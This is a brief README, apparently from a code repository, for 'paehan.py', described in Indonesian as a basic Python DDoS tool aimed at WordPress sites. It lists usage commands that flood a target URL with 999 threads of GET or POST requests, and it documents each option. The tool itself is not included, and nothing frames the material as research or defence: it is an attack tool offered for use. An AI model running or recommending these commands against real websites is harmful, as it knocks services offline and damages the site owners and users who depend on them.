# paehan.py
tools DDOS khusus untuk wordpress, basic python:


# Contoh
999 threads sends GET requests:

```bash
python paehan.py -t 999 -g 'https://targeted.site.com'
```

999 threads sends POST requests with json data:

```bash
python paehan.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
```

# gunakan
gunakan: paehan.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T]

optional arguments:

  -h, --help  show this help message and exit
  
  -g        Specify GET request. Usage: -g '< url >'
  
  -p        Specify POST request. Usage: -p '< url >'
  
  -d        Specify data payload for POST request
  
  -ah      Specify addtional header
  
  -t        Specify number of threads to be used
